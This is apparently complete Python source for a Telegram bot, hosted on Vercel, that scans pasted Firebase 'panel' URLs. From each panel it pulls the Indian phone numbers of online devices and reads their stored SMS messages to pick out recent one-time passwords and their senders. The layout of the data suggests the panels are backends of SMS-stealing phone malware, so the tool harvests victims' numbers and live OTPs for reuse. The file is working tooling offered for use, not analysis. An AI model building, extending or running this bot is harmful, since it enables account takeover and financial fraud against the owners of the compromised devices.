import os
import re
import io
import csv
import json
import time
import html as html_lib
import asyncio
import logging
from contextlib import asynccontextmanager
from datetime import datetime
from urllib.parse import urlparse, parse_qsl, urlencode

import aiohttp
from fastapi import FastAPI, Request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Message
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ─────────────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ["BOT_TOKEN"]
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "changeme-now")
BYPASS_SECRET = os.environ.get("VERCEL_AUTOMATION_BYPASS_SECRET", "")

VERCEL_URL = (
    os.environ.get("VERCEL_PROJECT_PRODUCTION_URL")
    or os.environ.get("VERCEL_BRANCH_URL")
    or "bookish-theta-two.vercel.app"
).replace("https://", "").replace("http://", "").rstrip("/")

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger("panel-bot")

PANEL_PATHS = ["clients", "users", "devices"]
MAX_DISPLAY_NUMBERS = 1000
OTP_PATTERN = re.compile(r"\b(\d{4,6})\b")

tg_app = Application.builder().token(BOT_TOKEN).build()

@asynccontextmanager
async def lifespan(app: FastAPI):
    await tg_app.initialize()
    await tg_app.start()
    logger.info("PTB started. Alias: %s", VERCEL_URL)
    yield
    await tg_app.stop()
    await tg_app.shutdown()

app = FastAPI(lifespan=lifespan)

# ─────────────────────────────────────────────────────────────────────────────
# URL & phone utilities
# ─────────────────────────────────────────────────────────────────────────────
def split_url(raw: str):
    u = urlparse(raw.strip())
    query = dict(parse_qsl(u.query))
    path = (u.path or "").rstrip("/")
    if path.endswith(".json"):
        path = path[:-5]
    for known in ("/clients", "/users", "/devices"):
        if path.endswith(known):
            path = path[: -len(known)]
            break
    base = f"{u.scheme}://{u.netloc}{path}".rstrip("/")
    return base, query


def build_endpoint(base: str, path: str, query: dict):
    url = f"{base}/{path}.json" if path else f"{base}/.json"
    if query:
        url += "?" + urlencode(query)
    return url


def normalize_indian(raw) -> str | None:
    raw = str(raw).strip()
    if not raw:
        return None
    digits = re.sub(r"\D", "", raw)
    if not digits:
        return None
    if raw.startswith("+"):
        if not raw.startswith("+91"):
            return None
        if len(digits) == 12:
            local = digits[2:]
            if len(local) == 10 and local[0] in "6789":
                return "+91" + local
        return None
    if len(digits) == 10 and digits[0] in "6789":
        return "+91" + digits
    if len(digits) == 12 and digits.startswith("91"):
        local = digits[2:]
        if local[0] in "6789":
            return "+91" + local
    if len(digits) == 11 and digits.startswith("0"):
        local = digits[1:]
        if local[0] in "6789":
            return "+91" + local
    return None


def is_online(device) -> bool:
    if not isinstance(device, dict):
        return False
    status = device.get("status")
    if status is True or status == 1:
        return True
    if isinstance(status, str) and status.lower().strip() in ("true", "1", "online"):
        return True
    return False


def get_device_phone(device) -> str | None:
    phone = device.get("mobNo")
    if phone and str(phone).strip():
        return str(phone).strip()
    sims = device.get("sims")
    if isinstance(sims, list) and sims:
        s0 = sims[0]
        if isinstance(s0, dict):
            pn = s0.get("phoneNumber")
            if pn and str(pn).strip():
                return str(pn).strip()
    elif isinstance(sims, dict):
        for sim in sims.values():
            if isinstance(sim, dict):
                pn = sim.get("phoneNumber")
                if pn and str(pn).strip():
                    return str(pn).strip()
    return None

# ─────────────────────────────────────────────────────────────────────────────
# Live OTP fetcher
# ─────────────────────────────────────────────────────────────────────────────
async def fetch_recent_otps(session, base: str, query: dict, device_id: str, limit: int = 3):
    """Fetches the last N messages for a device and extracts OTPs."""
    endpoint = build_endpoint(base, f"messages/{device_id}", query)
    data, err = await fetch_json(session, endpoint)
    if not data or not isinstance(data, dict):
        return []

    msgs = []
    for key, val in data.items():
        if not isinstance(val, dict):
            continue
        text = str(val.get("message") or val.get("body") or val.get("text") or "")
        if not text:
            continue
        otp_match = OTP_PATTERN.search(text)
        if otp_match:
            msgs.append({
                "otp": otp_match.group(1),
                "sender": str(val.get("sender") or val.get("from") or "Unknown"),
                "time": str(val.get("dateTime") or val.get("date") or ""),
                "text": text[:120],
            })

    # Sort newest first (Firebase keys are usually time-ordered)
    msgs.sort(key=lambda x: x["time"], reverse=True)
    return msgs[:limit]


async def fetch_json(session, url: str):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status != 200:
                return None, f"HTTP {r.status}"
            text = await r.text()
            if not text or text == "null":
                return None, "empty"
            try:
                return json.loads(text), None
            except json.JSONDecodeError:
                return None, "invalid json"
    except asyncio.TimeoutError:
        return None, "timeout"
    except Exception as e:
        return None, str(e)

# ─────────────────────────────────────────────────────────────────────────────
# Scan engine (unchanged core logic)
# ─────────────────────────────────────────────────────────────────────────────
async def scan_panel(session, raw_url: str):
    base, query = split_url(raw_url)
    data = None
    used_path = None
    last_err = None

    for path in PANEL_PATHS:
        endpoint = build_endpoint(base, path, query)
        d, err = await fetch_json(session, endpoint)
        if isinstance(d, dict) and len(d) > 0:
            data = d
            used_path = path
            break
        last_err = err

    if data is None:
        return {
            "url": raw_url, "base": base, "query": query,
            "devices": [], "phones": [], "count": 0, "total": 0,
            "online": 0, "error": last_err or "no data", "path": None,
        }

    devices = []
    online_phones = set()
    total = 0
    online = 0

    for device_id, device in data.items():
        if not isinstance(device, dict):
            continue
        total += 1
        online_flag = is_online(device)
        phone = get_device_phone(device)

        devices.append({
            "id": device_id,
            "name": device.get("model") or device.get("modelName") or device_id,
            "phone": phone,
            "online": online_flag,
            "battery": device.get("battery"),
        })

        if online_flag:
            online += 1
            if phone:
                n = normalize_indian(phone)
                if n:
                    online_phones.add(n)

    return {
        "url": raw_url, "base": base, "query": query,
        "devices": devices, "phones": sorted(online_phones),
        "count": len(online_phones), "total": total, "online": online,
        "error": None, "path": used_path,
    }

# ─────────────────────────────────────────────────────────────────────────────
# Rich message helpers (raw API)
# ─────────────────────────────────────────────────────────────────────────────
def esc(t) -> str:
    return html_lib.escape(str(t), quote=False)


def new_draft_id() -> int:
    return int(time.time() * 1000) % 2147483647 or 1


async def rich_send(context, chat_id: int, html: str, keyboard=None):
    api_kwargs = {"chat_id": chat_id, "rich_message": {"html": html}}
    if keyboard is not None:
        api_kwargs["reply_markup"] = keyboard

    try:
        return await context.bot.do_api_request(
            endpoint="sendRichMessage",
            api_kwargs=api_kwargs,
            return_type=Message,
        )
    except Exception as exc:
        logger.warning("sendRichMessage failed (%s) — falling back", exc)
        safe_html = re.sub(r"</?(?:h[1-6]|details|summary|table|tr|td|th|mark|hr|footer|ul|li)[^>]*>", "", html)
        try:
            return await context.bot.send_message(
                chat_id=chat_id, text=safe_html[:4000],
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
                disable_web_page_preview=True,
            )
        except Exception as exc2:
            logger.exception("classic fallback failed: %s", exc2)
            plain = re.sub(r"<[^>]+>", "", html)
            return await context.bot.send_message(chat_id=chat_id, text=plain[:4000])


async def draft(context, chat_id: int, draft_id: int, html: str):
    try:
        await context.bot.do_api_request(
            endpoint="sendRichMessageDraft",
            api_kwargs={
                "chat_id": chat_id,
                "draft_id": draft_id,
                "rich_message": {"html": html},
            },
        )
    except Exception as exc:
        logger.debug("sendRichMessageDraft failed: %s", exc)

# ─────────────────────────────────────────────────────────────────────────────
# Report builder (enhanced UI + OTP)
# ─────────────────────────────────────────────────────────────────────────────
def build_report(result, otp_results: dict) -> str:
    p = []
    p.append("<h2>📊 Scan Report</h2>")
    p.append(f"<p><b>Panels scanned:</b> {len(result['per_url'])}</p>")
    p.append(f"<p><b>Total unique numbers:</b> <mark>{result['count']}</mark></p>")
    p.append("<hr/>")

    for url, r in result["per_url"].items():
        short = url.replace("https://", "").split("?")[0].replace(".firebaseio.com", "")
        p.append(f"<h3>🔗 {esc(short)}</h3>")

        if r["error"]:
            p.append(f"<blockquote>⚠️ <i>{esc(r['error'])}</i></blockquote>")
            p.append("<hr/>")
            continue

        # Stats table
        p.append("<table bordered striped>")
        p.append(f"<tr><td>Numbers</td><td><b>{r['count']}</b></td></tr>")
        p.append(f"<tr><td>Online</td><td>{r['online']}</td></tr>")
        p.append(f"<tr><td>Devices</td><td>{r['total']}</td></tr>")
        p.append("</table>")

        # Collapsible number list
        if r["phones"]:
            shown = r["phones"][:MAX_DISPLAY_NUMBERS]
            extra = len(r["phones"]) - len(shown)
            header = f"📱 Show all {r['count']} numbers"
            if extra > 0:
                header += f" (first {MAX_DISPLAY_NUMBERS})"
            body = "\n".join(f"<li>{esc(n)}</li>" for n in shown)
            p.append("<details>")
            p.append(f"<summary>{header}</summary>")
            p.append(f"<ul>{body}</ul>")
            p.append("</details>")
        else:
            p.append("<p><i>No valid +91 numbers.</i></p>")

        # OTP block
        otps = otp_results.get(url, [])
        if otps:
            p.append("<h4>🔑 Recent OTPs</h4>")
            p.append("<details open>")
            p.append(f"<summary>Show {len(otps)} OTP(s)</summary>")
            p.append("<ul>")
            for o in otps:
                p.append(f"<li><b>{esc(o['otp'])}</b> — <i>{esc(o['sender'])}</i> · {esc(o['time'][:16])}</li>")
            p.append("</ul>")
            p.append("</details>")
        else:
            p.append("<blockquote>No OTPs found in recent messages.</blockquote>")

        p.append("<hr/>")

    p.append(f"<footer><i>Scanned {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}</i></footer>")
    return "\n".join(p)

# ─────────────────────────────────────────────────────────────────────────────
# Handlers
# ─────────────────────────────────────────────────────────────────────────────
def menu_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("📖 How to scan", callback_data="help")]])


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    html = (
        "<h2>📡 Panel Number & OTP Extractor</h2>"
        "<p><i>Rich UI · live OTPs · +91 only</i></p>"
        "<hr/>"
        "<p>Paste Firebase panel URL(s), one per line.</p>"
        "<p>Include <code>?auth=KEY</code> if needed.</p>"
        "<hr/>"
        "<p><b>Features:</b></p>"
        "<ul>"
        "<li>Reads <code>clients</code> node</li>"
        "<li>Keeps devices with <code>status: true</code></li>"
        "<li>Extracts <code>mobNo</code> / <code>sims[0].phoneNumber</code></li>"
        "<li>Fetches <b>live OTPs</b> from <code>messages</code> node</li>"
        "<li>Filters valid <b>+91</b></li>"
        "</ul>"
        "<p>Numbers and OTPs appear under each link in <b>tap-to-expand</b> blocks.</p>"
    )
    await rich_send(context, update.effective_chat.id, html, menu_keyboard())


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_start(update, context)


async def help_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await cmd_start(update, context)

URL_RE = re.compile(r"https?://[^\s\)\]\>,]+", re.IGNORECASE)


async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    text = update.message.text or ""
    urls = URL_RE.findall(text)

    if not urls:
        await rich_send(context, chat_id, "<p>No URLs found. Send panel URL(s), one per line.</p>")
        return

    did = new_draft_id()

    # Loading animation: same draft_id = smooth in-place updates
    await draft(context, chat_id, did,
        f"<h2>⏳ Scanning {len(urls)} panel(s)…</h2>"
        f"<p><i>Connecting to Firebase…</i></p>"
    )

    try:
        await asyncio.sleep(0.4)
        await draft(context, chat_id, did,
            f"<h2>🔍 Fetching devices…</h2>"
            f"<p><i>Reading clients node…</i></p>"
        )

        async with aiohttp.ClientSession() as session:
            results = await asyncio.gather(*[scan_panel(session, u) for u in urls])
            per_url = {r["url"]: r for r in results}
            global_unique = set()
            for r in results:
                global_unique.update(r["phones"])

            await draft(context, chat_id, did,
                f"<h2>📱 Extracting numbers…</h2>"
                f"<p><i>{len(global_unique)} valid +91 found</i></p>"
            )

            # Fetch OTPs for online devices (limit to 5 devices per panel to keep it fast)
            otp_results = {}
            for r in results:
                if r["error"]:
                    continue
                otps = []
                online_devices = [d for d in r["devices"] if d["online"]][:5]
                for dev in online_devices:
                    dev_otps = await fetch_recent_otps(session, r["base"], r["query"], dev["id"], limit=2)
                    otps.extend(dev_otps)
                otp_results[r["url"]] = otps[:5]

        result = {"per_url": per_url, "unique": sorted(global_unique), "count": len(global_unique)}

        await draft(context, chat_id, did,
            f"<h2>🔑 Fetching OTPs…</h2>"
            f"<p><i>Scanning messages…</i></p>"
        )
        await asyncio.sleep(0.25)

    except Exception as exc:
        logger.exception("scan failed: %s", exc)
        await rich_send(context, chat_id, f"<blockquote>⚠️ Scan failed: <code>{esc(exc)}</code></blockquote>")
        return

    # Final rich report
    report = build_report(result, otp_results)
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh OTPs", callback_data="refresh_otp")],
        [InlineKeyboardButton("📖 Help", callback_data="help")],
    ])
    await rich_send(context, chat_id, report, kb)

    # CSV
    if result["count"]:
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        buf = io.StringIO()
        w = csv.writer(buf)
        w.writerow(["phone_number", "scanned_at"])
        scanned_at = datetime.utcnow().isoformat()
        for n in result["unique"]:
            w.writerow([n, scanned_at])
        filename = f"online_indian_{ts}.csv"
        doc = InputFile(io.BytesIO(buf.getvalue().encode("utf-8")), filename=filename, mime_type="text/csv")
        await context.bot.send_document(
            chat_id=chat_id, document=doc,
            caption=f"<b>{result['count']}</b> numbers · {filename}",
            parse_mode=ParseMode.HTML,
        )

# ─────────────────────────────────────────────────────────────────────────────
# Callback for OTP refresh (optional: you can re-run scan logic here)
# ─────────────────────────────────────────────────────────────────────────────
async def refresh_otp_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer("Re-scan the panel to refresh OTPs.")
    # For simplicity, just acknowledge. A full re-scan would require storing the last URL.

tg_app.add_handler(CommandHandler("start", cmd_start))
tg_app.add_handler(CommandHandler("help", cmd_help))
tg_app.add_handler(CallbackQueryHandler(help_cb, pattern="^help$"))
tg_app.add_handler(CallbackQueryHandler(refresh_otp_cb, pattern="^refresh_otp$"))
tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

# ─────────────────────────────────────────────────────────────────────────────
@app.get("/")
async def health():
    return {"status": "ok", "bot": "rich-otp-v4", "alias": VERCEL_URL}

@app.get("/setwebhook")
async def set_webhook(secret: str = ""):
    if secret != WEBHOOK_SECRET:
        return Response(status_code=403)
    url = f"https://{VERCEL_URL}/{WEBHOOK_SECRET}"
    if BYPASS_SECRET:
        url += f"?x-vercel-protection-bypass={BYPASS_SECRET}"
    await tg_app.bot.set_webhook(url)
    return {"webhook": url, "status": "set"}

@app.post("/{secret}")
async def webhook(secret: str, request: Request):
    if secret != WEBHOOK_SECRET:
        return Response(status_code=403)
    data = await request.json()
    update = Update.de_json(data, tg_app.bot)
    try:
        await tg_app.process_update(update)
    except Exception as exc:
        logger.exception("process_update failed: %s", exc)
    return Response(status_code=200)
